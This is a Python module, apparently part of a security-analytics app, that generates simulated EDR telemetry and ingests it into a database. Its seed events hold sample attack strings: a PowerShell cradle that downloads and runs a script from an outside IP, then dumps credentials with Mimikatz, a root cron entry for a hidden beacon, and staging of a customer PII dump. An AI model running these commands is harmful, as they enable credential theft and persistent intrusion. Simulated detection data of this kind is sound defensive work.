from datetime import UTC, datetime, timedelta
import json
import logging
from typing import Any

from sqlalchemy import select
from sqlalchemy.orm import Session

from app.adapters.base import BaseSourceAdapter
from app.models.entities import Asset, EdrEvent, User

logger = logging.getLogger(__name__)

CORE_EDR_SCENARIO_EVENTS: list[dict[str, Any]] = [
    {
        "event_id_code": "EDR-001",
        "endpoint_id": "PAYMENT-API-01",
        "user_id_code": "USR-001",
        "event_type": "SUSPICIOUS_PROCESS",
        "process_name": "powershell.exe",
        "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "indicator": "credential_dumping",
        "severity": "critical",
        "minutes_ago": 10,
        "payload": {
            "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://194.26.29.11/p.ps1'); Invoke-Mimikatz -DumpCreds",
            "parent_process": "w3wp.exe",
            "threat_family": "Mimikatz.MemoryDump",
        },
    },
    {
        "event_id_code": "EDR-002",
        "endpoint_id": "PAYMENT-API-01",
        "user_id_code": "USR-001",
        "event_type": "POWERSHELL_EXECUTION",
        "process_name": "powershell.exe",
        "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "indicator": "obfuscated_script",
        "severity": "high",
        "minutes_ago": 14,
        "payload": {
            "command_line": "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...",
            "parent_process": "cmd.exe",
        },
    },
    {
        "event_id_code": "EDR-003",
        "endpoint_id": "GATEWAY-01",
        "user_id_code": "USR-003",
        "event_type": "PERSISTENCE_INDICATOR",
        "process_name": "cron_injector.sh",
        "process_path": "/tmp/cron_injector.sh",
        "indicator": "scheduled_task_creation",
        "severity": "high",
        "minutes_ago": 20,
        "payload": {
            "file_written": "/etc/cron.d/sync-agent",
            "cron_entry": "*/10 * * * * root /tmp/.hidden/beacon",
        },
    },
    {
        "event_id_code": "EDR-004",
        "endpoint_id": "CUSTOMER-DB-01",
        "user_id_code": "USR-001",
        "event_type": "FILE_MODIFICATION",
        "process_name": "pg_dump",
        "process_path": "/usr/bin/pg_dump",
        "indicator": "data_staging_for_exfiltration",
        "severity": "critical",
        "minutes_ago": 5,
        "payload": {
            "target_archive": "/tmp/cust_pii_dump.tar.gz",
            "records_extracted": 450000,
        },
    },
]


class EDRSimulator:
    """Deterministic generator for realistic endpoint detection and response (EDR) telemetry."""

    @classmethod
    def generate(cls, count: int = 60) -> list[dict[str, Any]]:
        events: list[dict[str, Any]] = [dict(e) for e in CORE_EDR_SCENARIO_EVENTS]

        templates = [
            ("SUSPICIOUS_PROCESS", "cmd.exe", "/bin/sh", "living_off_the_land", "medium"),
            ("POWERSHELL_EXECUTION", "powershell.exe", "powershell.exe", "script_execution", "low"),
            ("CREDENTIAL_DUMPING", "procdump.exe", "gcore", "memory_inspection", "high"),
            ("MALWARE_DETECTION", "beacon.exe", "rootkit.ko", "signature_match", "critical"),
            ("UNUSUAL_NETWORK_CONNECTION", "curl", "nc", "reverse_shell", "high"),
            ("PERSISTENCE_INDICATOR", "registry_edit", "systemd_unit", "startup_entry", "medium"),
            ("FILE_MODIFICATION", "encryptor.exe", "tar", "bulk_file_write", "high"),
        ]

        now = datetime.now(UTC)
        index = len(events) + 1
        t_idx = 0
        while len(events) < max(count, len(CORE_EDR_SCENARIO_EVENTS)):
            etype, proc_win, proc_lin, ind, sev = templates[t_idx % len(templates)]
            code = f"EDR-{index:03d}"
            endpoint = "PAYMENT-API-01" if index % 6 == 0 else f"EP-{index % 15 + 1:03d}"
            user_code = "USR-001" if index % 7 == 0 else f"USR-{index % 25 + 1:03d}"
            proc = proc_win if index % 2 == 0 else proc_lin
            path = f"C:\\Program Files\\CyberVal\\{proc}" if index % 2 == 0 else f"/usr/local/bin/{proc}"
            mins = (index * 17) % 2880

            events.append({
                "event_id_code": code,
                "endpoint_id": endpoint,
                "user_id_code": user_code,
                "event_type": etype,
                "process_name": proc,
                "process_path": path,
                "indicator": ind,
                "severity": sev,
                "minutes_ago": mins,
                "payload": {"simulated": True, "seq": index},
            })
            index += 1
            t_idx += 1

        return events[:count]


class EDRAdapter(BaseSourceAdapter):
    """Adapter for ingesting and normalizing EDR endpoint telemetry."""

    @property
    def source_name(self) -> str:
        return "edr"

    def fetch(self, count: int = 60, **kwargs) -> list[dict[str, Any]]:
        return EDRSimulator.generate(count=count)

    def normalize(self, raw_records: list[dict[str, Any]]) -> list[dict[str, Any]]:
        now = datetime.now(UTC)
        normalized: list[dict[str, Any]] = []

        for r in raw_records:
            mins = r.get("minutes_ago", 0)
            observed_at = r.get("observed_at") or (now - timedelta(minutes=mins))
            if isinstance(observed_at, str):
                try:
                    observed_at = datetime.fromisoformat(observed_at.replace("Z", "+00:00"))
                except ValueError:
                    observed_at = now

            code = r.get("event_id_code") or r.get("event_id") or f"EDR-{len(normalized) + 1:03d}"
            endpoint = r.get("endpoint_id") or r.get("asset_id_code") or r.get("asset_id") or "UNKNOWN-EP"
            user_code = r.get("user_id_code") or r.get("user_id")

            normalized.append({
                "event_id_code": str(code).strip().upper(),
                "endpoint_id": str(endpoint).strip().upper(),
                "user_id_code": str(user_code).strip().upper() if user_code else None,
                "event_type": str(r.get("event_type", "SUSPICIOUS_PROCESS")).strip().upper(),
                "process_name": r.get("process_name"),
                "process_path": r.get("process_path"),
                "indicator": r.get("indicator"),
                "severity": str(r.get("severity", "medium")).lower(),
                "observed_at": observed_at,
                "raw_payload": r.get("payload") or r.get("raw_payload") or {},
            })
        return normalized

    def validate(self, normalized_records: list[dict[str, Any]]) -> list[dict[str, Any]]:
        valid: list[dict[str, Any]] = []
        for r in normalized_records:
            if r.get("endpoint_id") and r.get("event_type"):
                valid.append(r)
        return valid

    def ingest(self, db: Session, records: list[dict[str, Any]] | None = None, count: int = 60, **kwargs) -> int:
        if records is None:
            raw = self.fetch(count=count)
        else:
            raw = records

        normalized = self.normalize(raw)
        validated = self.validate(normalized)

        # Pre-fetch existing assets and users to map business codes to database integer PKs
        assets_map: dict[str, int] = {}
        for a in db.scalars(select(Asset)).all():
            if a.asset_id_code:
                assets_map[a.asset_id_code.upper()] = a.id
            assets_map[a.name.upper()] = a.id

        users_map: dict[str, int] = {}
        for u in db.scalars(select(User)).all():
            if u.user_id_code:
                users_map[u.user_id_code.upper()] = u.id
            if u.username:
                users_map[u.username.upper()] = u.id
            users_map[u.email.upper()] = u.id

        ingested_count = 0
        for item in validated:
            asset_db_id = assets_map.get(item["endpoint_id"])
            user_db_id = users_map.get(item["user_id_code"]) if item.get("user_id_code") else None

            event = EdrEvent(
                event_id_code=item["event_id_code"],
                endpoint_id=item["endpoint_id"],
                asset_id=asset_db_id,
                user_id_code=item["user_id_code"],
                user_id=user_db_id,
                event_type=item["event_type"],
                process_name=item["process_name"],
                process_path=item["process_path"],
                indicator=item["indicator"],
                severity=item["severity"],
                observed_at=item["observed_at"],
                raw_payload=json.dumps(item.get("raw_payload", {}), default=str),
            )
            db.add(event)
            ingested_count += 1

        db.commit()
        return ingested_count
